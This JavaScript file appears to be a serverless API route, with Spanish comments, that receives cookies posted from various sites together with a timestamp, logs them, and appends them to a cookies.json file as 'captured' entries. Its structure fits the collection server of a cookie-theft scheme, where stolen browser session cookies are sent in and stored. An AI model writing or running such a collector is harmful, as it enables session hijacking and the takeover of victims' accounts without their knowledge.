export default function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const { site, cookies, timestamp } = req.body;
      
      // Guardar las cookies en un archivo o base de datos
      console.log('Cookies recibidas de:', site);
      console.log('Timestamp:', timestamp);
      console.log('Datos:', cookies);
      
      // Aquí puedes guardar los datos en una base de datos
      // Por ejemplo, en Vercel KV, MongoDB, etc.
      
      // Opción simple: guardar en un archivo JSON (solo para pruebas)
      const fs = require('fs');
      const path = require('path');
      
      // Ruta al archivo de datos
      const dataPath = path.join(process.cwd(), 'data', 'cookies.json');
      
      // Crear la carpeta data si no existe
      if (!fs.existsSync(path.dirname(dataPath))) {
        fs.mkdirSync(path.dirname(dataPath));
      }
      
      // Leer datos existentes
      let cookiesData = [];
      if (fs.existsSync(dataPath)) {
        const fileContent = fs.readFileSync(dataPath, 'utf8');
        cookiesData = JSON.parse(fileContent);
      }
      
      // Añadir las nuevas cookies
      cookiesData.push({
        site,
        cookies,
        timestamp,
        capturedAt: new Date().toISOString()
      });
      
      // Guardar los datos actualizados
      fs.writeFileSync(dataPath, JSON.stringify(cookiesData, null, 2));
      
      res.status(200).json({ 
        success: true, 
        message: 'Cookies guardadas correctamente',
        count: cookiesData.length
      });
    } catch (error) {
      console.error('Error al procesar cookies:', error);
      res.status(500).json({ 
        success: false, 
        error: error.message 
      });
    }
  } else {
    res.status(405).json({ error: 'Método no permitido' });
  }
}
